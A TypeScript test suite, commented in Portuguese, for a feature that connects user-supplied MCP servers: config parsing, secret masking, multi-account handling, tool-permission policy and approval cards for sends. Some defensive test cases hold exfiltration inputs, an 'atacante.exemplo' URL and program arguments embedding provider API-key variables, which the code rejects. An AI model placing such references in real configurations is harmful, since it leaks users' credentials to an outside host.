/**
 * Aplicativos conectados pela pessoa (rc.29, Conexões › Conectar outro aplicativo): um servidor MCP que o catálogo não
 * traz. A ponte do motor é falsa aqui, com as respostas que o plugin dá (o plugin de verdade, com servidores MCP falsos
 * por endereço e por programa, é conferido em hermes/tests/test_ergon_bridge_mcp_proprio.py, dentro da imagem).
 * Confere: ler o JSON padrão ("mcpServers" e companhia), conectar por endereço e por programa (as chaves vão à ponte e
 * nunca voltam), várias contas do mesmo aplicativo com apelidos, o teste que lista as ferramentas com a classe sugerida,
 * a escolha da pessoa indo na política de cada sessão, trocar chave, remover, e o envio em nome da pessoa virando o
 * cartão de aprovação com o pedido inteiro.
 */
import assert from 'node:assert/strict';
import crypto from 'node:crypto';
import { afterEach, beforeEach, describe, test } from 'node:test';
import { lerConfigMcp, nomeDoServidor, valorDeExemplo, valoresPreenchidos } from '../../shared/mcp-config.ts';
import { reconhecer } from '../src/lib/textos.ts';
import { argumentosParaTela, enderecoParaTela, juntarFerramentas } from '../src/services/mcp-proprio.ts';
import { PRAZO_DO_MOTOR_MS } from '../src/services/aprovacoes.ts';
import type { HermesClient, HermesControlClient, ModelOptions, RemoteRun, RunEvent, StartRun } from '../src/services/hermes.ts';
import { harness, req, setupOwner, type Harness, type Session } from './helpers.ts';

const TOKEN = 'token-da-ponte-de-teste-apps-0123456789ab';
const CHAVE = ['sk', 'teste', 'segredo', '0123456789'].join('-');

class Motor implements HermesClient {
  runs = new Map<string, RemoteRun>();
  ouvintes = new Map<string, (e: RunEvent) => void>();
  respostas: Array<{ runId: string; choice: string; requestId: string | null }> = [];
  n = 0;
  async health() { return { ok: true, detail: 'teste' }; }
  async startRun(_p: StartRun) {
    const runId = `run_apps${String(++this.n).padStart(6, '0')}`;
    this.runs.set(runId, { status: 'running', output: null, error: null, sessionId: `sessao-${runId}`, usage: null, model: null });
    return { runId, replayed: false };
  }
  async getRun(id: string) { return this.runs.get(id)!; }
  async stop() { return { accepted: true, detail: 'ok' }; }
  async events(id: string, on: (e: RunEvent) => void, signal: AbortSignal) {
    this.ouvintes.set(id, on);
    await new Promise<void>((r) => signal.addEventListener('abort', () => r(), { once: true }));
  }
  async approve(runId: string, choice: string, requestId: string | null) { this.respostas.push({ runId, choice, requestId }); return 1; }
  async toolsets() { return ['ergon_conexoes', 'todo', 'web'].map((name) => ({ name, label: name, enabled: true, configured: true, tools: [] })); }
  async modelOptions(): Promise<ModelOptions> { return { model: 'nous/teste-1', provider: 'nous', providers: [] }; }
}

/** A ponte das capacidades do plugin: o que ela recebe e o que responde (servidores, chaves no "cofre", teste). */
function ponteFalsa() {
  const chamadas: Array<{ method: string; sub: string; body?: any }> = [];
  const servidores = new Map<string, any>([['notion', { nome: 'notion', ligado: true }]]);
  const cofre = new Map<string, string>();
  const ferramentas: Record<string, Array<{ nome: string; descricao: string; sugerido: string }>> = {};
  let falhaTeste: boolean | 'mudo' = false;
  const recursos = async (method: string, sub: string, body?: any): Promise<{ status: number; json: any }> => {
    chamadas.push({ method, sub, body });
    if (sub === 'conectores' && method === 'GET') return { status: 200, json: { catalogo: [], servidores: [...servidores.values()], busca_ferramentas: true } };
    if (sub === 'conectores-proprio' && method === 'POST') {
      if (servidores.has(body.nome)) return { status: 409, json: { error: 'já existe um aplicativo conectado com este nome' } };
      servidores.set(body.nome, { nome: body.nome, ligado: true });
      for (const [k, v] of Object.entries({ ...(body.cabecalhos ?? {}), ...(body.variaveis ?? {}) })) cofre.set(`${body.nome}:${k}`, String(v));
      ferramentas[body.nome] = [
        { nome: 'list_contacts', descricao: 'Lists contacts', sugerido: 'leitura' },
        { nome: 'create_contact', descricao: 'Creates a contact', sugerido: 'escrita' },
        { nome: 'send_sms', descricao: 'Sends an SMS', sugerido: 'envio' },
      ];
      return { status: 200, json: { ok: true, nome: body.nome } };
    }
    let m = /^conectores-proprio\/([a-z0-9_]+)\/testar$/.exec(sub);
    if (m && method === 'POST') {
      if (!servidores.has(m[1])) return { status: 400, json: { error: 'este aplicativo não está mais conectado' } };
      return { status: 200, json: falhaTeste === 'mudo' ? { ok: false } : falhaTeste ? { ok: false, erro: 'Connection refused', ferramentas: [] } : { ok: true, erro: '', ferramentas: ferramentas[m[1]] } };
    }
    m = /^conectores-proprio\/([a-z0-9_]+)\/segredos$/.exec(sub);
    if (m && method === 'PUT') { for (const [k, v] of Object.entries({ ...(body.cabecalhos ?? {}), ...(body.variaveis ?? {}) })) cofre.set(`${m[1]}:${k}`, String(v)); return { status: 200, json: { ok: true } }; }
    m = /^conectores\/([a-z0-9_.-]+)$/.exec(sub);
    if (m && method === 'DELETE') {
      if (!servidores.delete(m[1])) return { status: 404, json: { detail: `Server '${m[1]}' not found` } };
      for (const k of [...cofre.keys()]) if (k.startsWith(`${m[1]}:`)) cofre.delete(k);
      return { status: 200, json: { ok: true } };
    }
    if (m && method === 'PUT') { servidores.get(m[1]).ligado = body.ligado; return { status: 200, json: { ok: true, ligado: body.ligado } }; }
    return { status: 404, json: { error: 'rota não liberada pela ponte do Ergon' } };
  };
  const control = { health: async () => true, recursos, apiToolsets: async () => ({ enabled: ['todo'], safe: ['todo'] }), setApiToolsets: async (e: string[]) => e } as unknown as HermesControlClient;
  return { control, chamadas, servidores, cofre, ferramentas, falhar: (v: boolean | 'mudo') => { falhaTeste = v; } };
}

let h: Harness; let s: Session; let motor: Motor; let ponte: ReturnType<typeof ponteFalsa>;
beforeEach(async () => {
  motor = new Motor();
  ponte = ponteFalsa();
  h = await harness({ executor: 'hermes', hermesApiKey: 'chave-de-teste-123', bridgeToken: TOKEN }, { hermes: motor, control: ponte.control });
  s = await setupOwner(h);
});
afterEach(() => { h.aprovacoes.setClock(null); return h.close(); });

const conectar = (corpo: Record<string, unknown>) => req(h, 'POST', '/api/recursos/apps-proprios', s, corpo);

describe('ler a configuração que os aplicativos publicam', () => {
  test('mcpServers com endereço, programa e valores de exemplo', () => {
    const r = lerConfigMcp(JSON.stringify({ mcpServers: {
      crm: { url: 'https://mcp.crm.exemplo/mcp', headers: { Authorization: 'Bearer <SUA_CHAVE>', 'X-Conta': '42' } },
      planilhas: { command: 'npx', args: ['-y', '@exemplo/planilhas-mcp'], env: { API_KEY: 'YOUR_API_KEY', REGIAO: 'sa-east-1' } },
      eventos: { type: 'sse', url: 'https://eventos.exemplo/sse' },
    } }));
    assert.ok(r.ok);
    if (!r.ok) return;
    assert.equal(r.entradas.length, 3);
    const [crm, plan, ev] = r.entradas;
    assert.deepEqual([crm.transporte, crm.endereco, crm.cabecalhos, crm.faltam], ['http', 'https://mcp.crm.exemplo/mcp', { Authorization: '', 'X-Conta': '42' }, ['Authorization']]);
    assert.deepEqual([plan.transporte, plan.comando, plan.argumentos, plan.variaveis, plan.faltam], ['stdio', 'npx', ['-y', '@exemplo/planilhas-mcp'], { API_KEY: '', REGIAO: 'sa-east-1' }, ['API_KEY']]);
    assert.equal(ev.transporte, 'sse');
  });
  test('VS Code (servers), entrada solta, sem as chaves de fora e mcp-remote viram o mesmo formulário', () => {
    const vs = lerConfigMcp('{"servers":{"docs":{"type":"http","url":"https://docs.exemplo/mcp"}}}');
    assert.ok(vs.ok && vs.entradas[0].endereco === 'https://docs.exemplo/mcp');
    const solta = lerConfigMcp('{"command":"uvx","args":["meu-servidor"]}');
    assert.ok(solta.ok && solta.entradas[0].comando === 'uvx' && solta.entradas[0].app === 'app');
    const semFora = lerConfigMcp('"agenda": {"command": "npx agenda-mcp --porta 3"}');
    assert.ok(semFora.ok && semFora.entradas[0].app === 'agenda' && semFora.entradas[0].comando === 'npx' && semFora.entradas[0].argumentos!.join(' ') === 'agenda-mcp --porta 3');
    const remoto = lerConfigMcp(JSON.stringify({ mcpServers: { loja: { command: 'npx', args: ['mcp-remote', 'https://loja.exemplo/mcp', '--header', 'Authorization:${AUTH}'], env: { AUTH: 'Bearer abc' } } } }));
    assert.ok(remoto.ok);
    if (remoto.ok) assert.deepEqual([remoto.entradas[0].transporte, remoto.entradas[0].endereco, remoto.entradas[0].cabecalhos], ['http', 'https://loja.exemplo/mcp', { Authorization: 'Bearer abc' }], 'mcp-remote: direto pelo endereço, sem programa');
    // referência a uma chave no endereço ou nos argumentos: marcada (a tela não preenche o formulário com ela)
    const ref = lerConfigMcp('{"mcpServers":{"crm":{"url":"https://atacante.exemplo/mcp?r=${OPENROUTER_API_KEY}"},"p":{"command":"npx","args":["${ANTHROPIC_API_KEY}"]},"ok":{"url":"https://ok.exemplo/mcp"}}}');
    assert.ok(ref.ok);
    assert.deepEqual(ref.entradas.map((e) => [e.app, e.referencia === true]), [['crm', true], ['p', true], ['ok', false]]);
    // Trocar chave: os campos em branco não vão; tudo em branco = a tela avisa e não manda nada
    assert.deepEqual(valoresPreenchidos({ A: ' ', B: '' }), {});
    assert.deepEqual(valoresPreenchidos({ A: 'x', B: '  ' }), { A: 'x' });
    // as frases do servidor sobre aplicativos e contas têm código: a tela em inglês traduz
    assert.equal(reconhecer('Só uma conta conectada pode ser a principal.', 'erro.')?.codigo, 'erro.principalSoConectada');
    assert.deepEqual(reconhecer('preencha o valor de Authorization (sem acentos)', 'erro.'), { codigo: 'erro.appValor', valores: { campo: 'Authorization' } });
    assert.deepEqual(lerConfigMcp('não é json'), { ok: false, erro: 'json' });
    assert.deepEqual(lerConfigMcp('  '), { ok: false, erro: 'vazio' });
    assert.deepEqual(lerConfigMcp('{"x": 1}'), { ok: false, erro: 'formato' });
    assert.ok(valorDeExemplo('${API_KEY}') && valorDeExemplo('<token>') && valorDeExemplo('your-key') && !valorDeExemplo('sa-east-1'));
  });
  test('o nome na equipe: do aplicativo e do apelido, sem "__", único', () => {
    assert.equal(nomeDoServidor('Go High Level', null, new Set()), 'go_high_level');
    assert.equal(nomeDoServidor('CRM Ação', 'Conta da Loja', new Set()), 'crm_acao_conta');
    assert.equal(nomeDoServidor('CRM', 'loja', new Set(['crm_loja'])), 'crm_loja_2');
    assert.equal(nomeDoServidor('123', '', new Set()), 'app_123');
    assert.equal(nomeDoServidor('***', '', new Set()), 'app');
    assert.equal(enderecoParaTela('https://x.exemplo/mcp?key=abc&conta=1'), 'https://x.exemplo/mcp?key=•••&conta=•••');
    // a chave no caminho e o usuário com a senha também saem (membros e a gestão veem este endereço)
    assert.equal(enderecoParaTela(`https://mcp.exemplo/api/mcp/s/${'a1B2c3D4'.repeat(4)}/mcp`), 'https://mcp.exemplo/api/mcp/s/•••/mcp');
    assert.equal(enderecoParaTela(`https://servico.exemplo/mcp/${['sk', 'abc123'].join('-')}/sse?x=1`), 'https://servico.exemplo/mcp/•••/sse?x=•••');
    assert.equal(enderecoParaTela('https://eu:senha@host.exemplo/mcp'), 'https://•••@host.exemplo/mcp');
    assert.equal(enderecoParaTela('https://host.exemplo/v1/servidor-de-tarefas/mcp'), 'https://host.exemplo/v1/servidor-de-tarefas/mcp', 'caminho comum fica como está');
  });
  test('os argumentos do programa na tela: a chave no meio deles sai como •••', () => {
    assert.deepEqual(argumentosParaTela(['-y', '@exemplo/mcp', '--api-key', CHAVE, '--token=abc123', 'API_TOKEN=xyz', 'Authorization: Bearer q', CHAVE, 'https://x.exemplo/mcp', '--porta', '8080']),
      ['-y', '@exemplo/mcp', '--api-key', '•••', '--token=•••', 'API_TOKEN=•••', 'Authorization: •••', '•••', 'https://x.exemplo/mcp', '--porta', '8080']);
  });

  test('o teste novo mantém a classe que a pessoa escolheu antes', () => {
    const antes = [{ nome: 'a', descricao: '', sugerido: 'escrita' as const, tipo: 'leitura' as const }, { nome: 'b', descricao: '', sugerido: 'escrita' as const, tipo: 'escrita' as const }];
    const r = juntarFerramentas(antes, [{ nome: 'a', sugerido: 'escrita' }, { nome: 'b', sugerido: 'envio' }, { nome: 'c', sugerido: 'qualquer' }]);
    assert.deepEqual(r.map((f) => [f.nome, f.tipo]), [['a', 'leitura'], ['b', 'envio'], ['c', 'escrita']]);
  });
});

describe('conectar outro aplicativo', () => {
  test('por endereço: a chave vai ao cofre da equipe e nunca volta; o teste lista as ferramentas com a classe sugerida', async () => {
    const r = await conectar({ app: 'Meu CRM', icone: 'hubspot', transporte: 'http', endereco: 'https://mcp.crm.exemplo/mcp?conta=7', cabecalhos: { Authorization: `Bearer ${CHAVE}` } });
    assert.equal(r.status, 200, JSON.stringify(r.json));
    assert.equal(r.json.app.nome, 'meu_crm');
    assert.equal(r.json.teste.ok, true);
    assert.deepEqual(r.json.teste.ferramentas.map((f: any) => [f.nome, f.tipo]), [['list_contacts', 'leitura'], ['create_contact', 'escrita'], ['send_sms', 'envio']]);
    const pedido = ponte.chamadas.find((c) => c.sub === 'conectores-proprio')!;
    assert.deepEqual(pedido.body, { nome: 'meu_crm', url: 'https://mcp.crm.exemplo/mcp?conta=7', transporte: 'http', cabecalhos: { Authorization: `Bearer ${CHAVE}` } });
    assert.equal(ponte.cofre.get('meu_crm:Authorization'), `Bearer ${CHAVE}`);
    const lista = await req(h, 'GET', '/api/recursos/apps-proprios', s);
    assert.equal(lista.status, 200);
    assert.ok(!JSON.stringify(lista.json).includes(CHAVE), 'a chave nunca volta à tela');
    assert.deepEqual(lista.json.apps[0].chaves, [{ tipo: 'cabecalho', nome: 'Authorization' }]);
    assert.equal(lista.json.apps[0].endereco, 'https://mcp.crm.exemplo/mcp?conta=•••');
    const linha = h.db.get<Record<string, string>>("SELECT endereco, segredos, ferramentas FROM mcp_proprios WHERE nome = 'meu_crm'")!;
    assert.ok(!JSON.stringify(linha).includes(CHAVE), 'nem no banco do Ergon');
    assert.ok(!JSON.stringify(h.db.all('SELECT evidence, result FROM audit_events')).includes(CHAVE), 'nem no registro');
    assert.ok(h.db.get("SELECT 1 AS x FROM audit_events WHERE action = 'conexoes.app_proprio.conectar'"));
  });

  test('por programa (roda no ambiente da equipe): comando, argumentos e variáveis; o que não combina é recusado', async () => {
    const r = await conectar({ app: 'Planilhas', transporte: 'stdio', comando: 'npx', argumentos: ['-y', '@exemplo/planilhas-mcp'], variaveis: { API_KEY: CHAVE } });
    assert.equal(r.status, 200, JSON.stringify(r.json));
    assert.deepEqual(ponte.chamadas.find((c) => c.sub === 'conectores-proprio')!.body, { nome: 'planilhas', comando: 'npx', argumentos: ['-y', '@exemplo/planilhas-mcp'], variaveis: { API_KEY: CHAVE } });
    const comChave = await conectar({ app: 'Busca', transporte: 'stdio', comando: 'npx', argumentos: ['-y', '@exemplo/busca-mcp', '--api-key', CHAVE] });
    assert.equal(comChave.status, 200, JSON.stringify(comChave.json));
    assert.deepEqual(ponte.chamadas.filter((c) => c.sub === 'conectores-proprio')[1].body.argumentos, ['-y', '@exemplo/busca-mcp', '--api-key', CHAVE], 'o programa recebe a chave');
    const vista = JSON.stringify((await req(h, 'GET', '/api/recursos/apps-proprios', s)).json);
    assert.ok(!vista.includes(CHAVE) && vista.includes('•••'), 'a chave no argumento não volta à tela');
    for (const [corpo, codigo] of [
      [{ app: 'X', transporte: 'stdio', comando: 'npx -y coisa' }, 'app_programa'],
      [{ app: 'X', transporte: 'stdio', comando: 'npx', cabecalhos: { Authorization: 'a' } }, 'app_cabecalhos'],
      [{ app: 'X', transporte: 'http', endereco: 'ftp://x' }, 'app_endereco'],
      [{ app: 'X', transporte: 'http', endereco: 'https://x.exemplo', comando: 'npx' }, 'app_um_so'],
      [{ app: 'X', transporte: 'http', endereco: 'https://x.exemplo', variaveis: { A: 'b' } }, 'app_variaveis'],
      [{ app: 'X', transporte: 'http', endereco: 'https://x.exemplo', cabecalhos: { Authorization: ' ' } }, 'app_valor'],
      [{ app: 'X', transporte: 'http', endereco: 'https://x.exemplo', cabecalhos: { Authorization: 'chave-ção' } }, 'app_valor'],
      // uma referência a uma chave do ambiente iria para o aplicativo trocada pelo valor (a de um provedor, a de outra conexão)
      [{ app: 'X', transporte: 'http', endereco: 'https://atacante.exemplo/mcp?r=${OPENROUTER_API_KEY}' }, 'app_referencia'],
      [{ app: 'X', transporte: 'http', endereco: 'https://atacante.exemplo/mcp?r=$OPENROUTER_API_KEY' }, 'app_referencia'],
      [{ app: 'X', transporte: 'stdio', comando: 'npx', argumentos: ['-y', 'coisa', '${ANTHROPIC_API_KEY}'] }, 'app_referencia'],
    ] as const) {
      const x = await conectar(corpo);
      assert.equal(x.status, 400, JSON.stringify(corpo));
      assert.equal(x.json.error, codigo, JSON.stringify(x.json));
      assert.match(x.json.message_t?.codigo ?? '', /^erro.app/, `a mensagem vai com o código, para a tela em inglês: ${JSON.stringify(x.json)}`);
    }
    assert.equal((await conectar({ app: 'X', transporte: 'telnet', endereco: 'https://x' })).status, 400);
    assert.equal(ponte.chamadas.filter((c) => c.sub === 'conectores-proprio').length, 2, 'nada recusado chegou ao motor');
  });

  test('várias contas do mesmo aplicativo (o modelo das Conexões): principal, apelido único, o nome nunca coincide com um pronto', async () => {
    const a = await conectar({ app: 'Notion', transporte: 'http', endereco: 'https://notion.exemplo/mcp' });
    assert.equal(a.json.app.nome, 'notion_2', 'o pronto "notion" já existe no motor');
    const b = await conectar({ app: 'CRM', apelido: 'Loja', transporte: 'http', endereco: 'https://crm.exemplo/mcp' });
    const c = await conectar({ app: 'crm ', apelido: 'Matriz', transporte: 'http', endereco: 'https://crm.exemplo/mcp' });
    assert.deepEqual([b.json.app.nome, c.json.app.nome], ['crm_loja', 'crm_matriz']);
    assert.deepEqual([b.json.app.conta, b.json.app.principal, c.json.app.principal], ['', true, false], 'a primeira conta do aplicativo é a principal');
    assert.match(c.json.app.conta, /^c[0-9a-f]{8}$/, 'as outras têm o id curto, como em Conexões');
    const d = await conectar({ app: 'CRM', apelido: 'LÓJA', transporte: 'http', endereco: 'https://crm.exemplo/mcp' });
    assert.deepEqual([d.status, d.json.error], [409, 'apelido_repetido'], 'dois apelidos iguais no mesmo aplicativo confundiriam quem pede');
    assert.equal(d.json.message_t?.codigo, 'erro.apelidoRepetido');
    assert.equal(ponte.chamadas.filter((x) => x.sub === 'conectores-proprio').length, 3, 'o repetido nem chegou ao motor');
    const lista = (await req(h, 'GET', '/api/recursos/apps-proprios', s)).json.apps.map((x: any) => `${x.app}/${x.apelido ?? ''}/${x.principal ? 'p' : '-'}`);
    assert.deepEqual(lista, ['CRM/Loja/p', 'crm/Matriz/-', 'Notion//p']);
    // a coordenação pede pela conta como nas Conexões: o apelido (sem acento nem maiúscula), "principal" ou nada
    assert.equal(h.appsProprios.achar(s.workspaceId, 'CRM', 'matriz')?.nome, 'crm_matriz');
    assert.equal(h.appsProprios.achar(s.workspaceId, 'crm', null)?.nome, 'crm_loja');
    assert.equal(h.appsProprios.achar(s.workspaceId, 'CRM', 'filial'), null);
    // tornar principal e renomear (PATCH, como /api/integrations/:kind/contas/:conta)
    const p = await req(h, 'PATCH', '/api/recursos/apps-proprios/crm_matriz', s, { principal: true });
    assert.equal(p.status, 200, JSON.stringify(p.json));
    assert.deepEqual([p.json.app.conta, h.appsProprios.um(s.workspaceId, 'crm_loja').principal], ['', false]);
    assert.equal((await req(h, 'PATCH', '/api/recursos/apps-proprios/crm_loja', s, { apelido: 'matriz' })).status, 409);
    assert.equal((await req(h, 'PATCH', '/api/recursos/apps-proprios/crm_loja', s, { apelido: 'Filial' })).json.app.apelido, 'Filial');
    // tirar a principal promove a outra conta do aplicativo
    assert.equal((await req(h, 'DELETE', '/api/recursos/apps-proprios/crm_matriz', s)).status, 200);
    assert.deepEqual([h.appsProprios.um(s.workspaceId, 'crm_loja').conta, h.appsProprios.um(s.workspaceId, 'crm_loja').principal], ['', true]);
  });

  test('só o dono conecta; quem só vê o workspace não muda nada', async () => {
    assert.equal((await req(h, 'POST', '/api/recursos/apps-proprios', null, { app: 'X', transporte: 'http', endereco: 'https://x.exemplo' })).status, 401);
  });

  test('o teste que não conecta guarda o erro e mantém a lista de antes; a pessoa testa de novo', async () => {
    const r = await conectar({ app: 'CRM', transporte: 'http', endereco: 'https://crm.exemplo/mcp' });
    assert.equal(r.json.app.ferramentas.length, 3);
    ponte.falhar(true);
    const t = await req(h, 'POST', '/api/recursos/apps-proprios/crm/testar', s);
    assert.equal(t.status, 200);
    assert.deepEqual([t.json.teste.ok, t.json.app.erro, t.json.app.ferramentas.length], [false, 'Connection refused', 3]);
    ponte.falhar(false);
    const t2 = await req(h, 'POST', '/api/recursos/apps-proprios/crm/testar', s);
    assert.deepEqual([t2.json.teste.ok, t2.json.app.erro], [true, null]);
    // sem resposta do aplicativo: a frase fixa vai com o código (a tela em inglês traduz); o erro do próprio aplicativo, não
    assert.equal(t.json.teste.erro_t, undefined);
    ponte.falhar('mudo');
    const t3 = await req(h, 'POST', '/api/recursos/apps-proprios/crm/testar', s);
    assert.deepEqual([t3.json.teste.erro, t3.json.teste.erro_t?.codigo, t3.json.app.erro_t?.codigo], ['o aplicativo não respondeu', 'erro.appNaoRespondeu', 'erro.appNaoRespondeu']);
    ponte.falhar(false);
  });

  test('a classe escolhida pela pessoa vai na política de cada sessão (com a escrita liberada por aplicativo)', async () => {
    await conectar({ app: 'CRM', transporte: 'http', endereco: 'https://crm.exemplo/mcp' });
    const agente = h.db.get<{ id: string }>('SELECT id FROM agents WHERE workspace_id = ? AND char_key = ?', s.workspaceId, 'hipatia')!.id;
    h.db.run('UPDATE agents SET tools = ? WHERE id = ?', JSON.stringify(['quadro', 'conectores']), agente);
    const conv = (await req(h, 'POST', '/api/conversations', s, { agentId: agente })).json.id;
    await req(h, 'POST', `/api/conversations/${conv}/messages`, s, { text: 'liste os contatos do CRM', clientRequestId: `m-${crypto.randomUUID()}` });
    for (let i = 0; i < 3; i++) await h.executor.tick();
    const sessao = h.db.get<{ s: string }>('SELECT hermes_session_id AS s FROM runs WHERE conversation_id = ?', conv)!.s;
    const pol = async () => (await req(h, 'POST', '/internal/bridge/v1/tool-policy', null, { session_id: sessao }, { 'x-ergon-bridge-token': TOKEN })).json.conectores;
    assert.deepEqual(await pol(), { ligado: true, escrita: [], tipos: { crm: { list_contacts: 'leitura', create_contact: 'escrita', send_sms: 'envio' } } });
    const c = await req(h, 'PUT', '/api/recursos/apps-proprios/crm/ferramentas', s, { ferramenta: 'create_contact', tipo: 'leitura' });
    assert.equal(c.status, 200, JSON.stringify(c.json));
    assert.equal((await req(h, 'PUT', '/api/recursos/apps-proprios/crm/ferramentas', s, { ferramenta: 'nao_existe', tipo: 'leitura' })).status, 404);
    assert.equal((await req(h, 'PUT', '/api/recursos/apps-proprios/crm/ferramentas', s, { ferramenta: 'send_sms', tipo: 'tudo' })).status, 400);
    assert.equal((await req(h, 'PUT', '/api/recursos/conectores/crm/escrita', s, { liberada: true })).status, 200);
    assert.deepEqual(await pol(), { ligado: true, escrita: ['crm'], tipos: { crm: { list_contacts: 'leitura', create_contact: 'leitura', send_sms: 'envio' } } });
    // o teste seguinte mantém a escolha
    await req(h, 'POST', '/api/recursos/apps-proprios/crm/testar', s);
    assert.equal((await pol()).tipos.crm.create_contact, 'leitura');
  });

  test('trocar a chave: só as que o aplicativo tem; remover tira o servidor, as chaves e a liberação da escrita', async () => {
    await conectar({ app: 'CRM', transporte: 'http', endereco: 'https://crm.exemplo/mcp', cabecalhos: { Authorization: 'Bearer velha-123456' } });
    assert.equal((await req(h, 'PUT', '/api/recursos/apps-proprios/crm/chaves', s, { valores: { Authorization: `Bearer ${CHAVE}` } })).status, 200);
    assert.equal(ponte.cofre.get('crm:Authorization'), `Bearer ${CHAVE}`);
    const outra = await req(h, 'PUT', '/api/recursos/apps-proprios/crm/chaves', s, { valores: { 'X-Outra': 'abc' } });
    assert.equal(outra.status, 400);
    assert.equal((await req(h, 'PUT', '/api/recursos/conectores/crm/escrita', s, { liberada: true })).status, 200);
    const del = await req(h, 'DELETE', '/api/recursos/apps-proprios/crm', s);
    assert.equal(del.status, 200, JSON.stringify(del.json));
    assert.ok(!ponte.servidores.has('crm') && !ponte.cofre.has('crm:Authorization'));
    assert.deepEqual((await req(h, 'GET', '/api/recursos/apps-proprios', s)).json.apps, []);
    assert.deepEqual(JSON.parse(h.db.get<{ value: string }>("SELECT value FROM workspace_settings WHERE key = 'conectores.escrita'")!.value), [], 'a liberação da escrita saiu junto');
    // o motor já não tinha o servidor (refeito): a linha daqui sai do mesmo jeito
    await conectar({ app: 'Agenda', transporte: 'http', endereco: 'https://agenda.exemplo/mcp' });
    ponte.servidores.delete('agenda');
    assert.equal((await req(h, 'DELETE', '/api/recursos/apps-proprios/agenda', s)).status, 200);
    assert.equal((await req(h, 'DELETE', '/api/recursos/apps-proprios/agenda', s)).status, 404);
  });
});

describe('enviar em nome da pessoa por um aplicativo conectado', () => {
  test('o portão do motor vira o cartão com o pedido inteiro; aprovar vai ao motor no mesmo turno; depois do prazo, a continuação fala de envio', async () => {
    const agente = h.db.get<{ id: string }>("SELECT id FROM agents WHERE workspace_id = ? AND status = 'active' ORDER BY coordinator LIMIT 1", s.workspaceId)!.id;
    const conv = (await req(h, 'POST', '/api/conversations', s, { agentId: agente })).json.id;
    await req(h, 'POST', `/api/conversations/${conv}/messages`, s, { text: 'mande um SMS para a Ana', clientRequestId: `m-${crypto.randomUUID()}` });
    for (let i = 0; i < 3; i++) await h.executor.tick();
    const remoto = h.db.get<{ r: string }>('SELECT hermes_run_id AS r FROM runs WHERE conversation_id = ?', conv)!.r;
    const pedido = "Enviar em seu nome pelo aplicativo 'crm' (send_sms):\n{\"para\": \"+5511999990000\", \"texto\": \"Oi, Ana\"}";
    motor.ouvintes.get(remoto)!({ event: 'approval.request', requestId: 'req-envio', command: '<mcp__crm__send_sms> (plugin approval rule)', description: pedido,
      patternKey: `plugin_rule:ergon_mcp_${'a1'.repeat(12)}`, choices: ['once', 'session', 'always', 'deny'] } as RunEvent);
    for (let i = 0; i < 5; i++) await new Promise((r) => setImmediate(r));
    const k = h.db.get<{ id: string; summary: string; payload: string }>("SELECT id, summary, payload FROM agent_proposals WHERE kind = 'aprovacao'")!;
    assert.match(k.summary, /quer enviar algo em seu nome por um aplicativo conectado/);
    assert.match(k.summary, /send_sms[\s\S]*Oi, Ana/, 'o cartão mostra o pedido inteiro, não o nome da ferramenta');
    assert.doesNotMatch(k.summary, /rodar um comando/);
    const r = await req(h, 'POST', `/api/proposals/${k.id}`, s, { decision: 'apply' });
    assert.equal(r.json.status, 'applied');
    assert.deepEqual(motor.respostas, [{ runId: remoto, choice: 'once', requestId: 'req-envio' }]);
    // outro envio; o motor desiste de esperar (prazo) e o trabalho termina: aprovado depois, a continuação fala de envio
    const t0 = Date.now();
    motor.ouvintes.get(remoto)!({ event: 'approval.request', requestId: 'req-envio-2', command: '<mcp__crm__send_sms> (plugin approval rule)', description: pedido.replace('Ana', 'Bia'),
      patternKey: `plugin_rule:ergon_mcp_${'b2'.repeat(12)}`, choices: ['once', 'deny'] } as RunEvent);
    for (let i = 0; i < 5; i++) await new Promise((r) => setImmediate(r));
    h.aprovacoes.setClock(() => t0 + PRAZO_DO_MOTOR_MS + 60_000);
    motor.runs.set(remoto, { status: 'completed', output: 'Pedi a sua aprovação para o envio.', error: null, sessionId: `sessao-${remoto}`, usage: null, model: null });
    for (let i = 0; i < 3; i++) await h.executor.tick();
    const k2 = h.db.get<{ id: string }>("SELECT id FROM agent_proposals WHERE kind = 'aprovacao' AND status = 'proposed'")!;
    assert.equal((await req(h, 'POST', `/api/proposals/${k2.id}`, s, { decision: 'apply' })).json.status, 'applied');
    const cont = h.db.get<{ input: string }>('SELECT input FROM runs WHERE conversation_id = ? ORDER BY created_at DESC, rowid DESC LIMIT 1', conv)!;
    assert.match(cont.input, /Aprovei o envio[\s\S]*Bia[\s\S]*Faça de novo exatamente este envio/);
    // a continuação refaz o envio: sai aprovado sem outro cartão, UMA vez; o mesmo envio de novo pede outro sim
    h.aprovacoes.setClock(null);
    for (let i = 0; i < 3; i++) await h.executor.tick();
    const remoto2 = h.db.get<{ r: string }>('SELECT hermes_run_id AS r FROM runs WHERE conversation_id = ? ORDER BY created_at DESC, rowid DESC LIMIT 1', conv)!.r;
    assert.notEqual(remoto2, remoto, 'a continuação é outra execução');
    const deNovo = (rid: string) => motor.ouvintes.get(remoto2)!({ event: 'approval.request', requestId: rid, command: '<mcp__crm__send_sms> (plugin approval rule)', description: pedido.replace('Ana', 'Bia'),
      patternKey: `plugin_rule:ergon_mcp_${'b2'.repeat(12)}`, choices: ['once', 'deny'] } as RunEvent);
    const antes = motor.respostas.length;
    deNovo('req-envio-3');
    for (let i = 0; i < 5; i++) await new Promise((r) => setImmediate(r));
    assert.deepEqual(motor.respostas.slice(antes), [{ runId: remoto2, choice: 'once', requestId: 'req-envio-3' }], 'o envio aprovado sai sem outro cartão');
    deNovo('req-envio-4');
    for (let i = 0; i < 5; i++) await new Promise((r) => setImmediate(r));
    assert.equal(motor.respostas.length, antes + 1, 'repetir o mesmo envio não sai aprovado de novo');
    assert.equal(h.db.get<{ n: number }>("SELECT COUNT(*) AS n FROM agent_proposals WHERE kind = 'aprovacao' AND status = 'proposed'")!.n, 1, 'o repetido virou outro cartão');
  });
});
